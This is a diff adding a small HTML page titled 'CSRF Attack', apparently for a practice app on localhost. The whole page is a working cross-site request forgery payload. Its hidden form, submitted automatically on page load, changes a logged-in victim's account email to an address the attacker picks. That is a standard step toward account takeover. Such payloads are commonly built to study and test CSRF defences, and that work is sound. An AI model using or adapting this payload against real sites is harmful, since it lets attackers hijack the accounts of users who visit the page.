@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost/vulbapp/change-email.php" method="POST">
+    <input type="hidden" name="email" value="lisacooper6779@gmail.com">
+    <input type="submit" value="Submit request">
+  </form>
+  <p>If you're seeing this, the attack form has already submitted.</p>
+</body>
+</html>
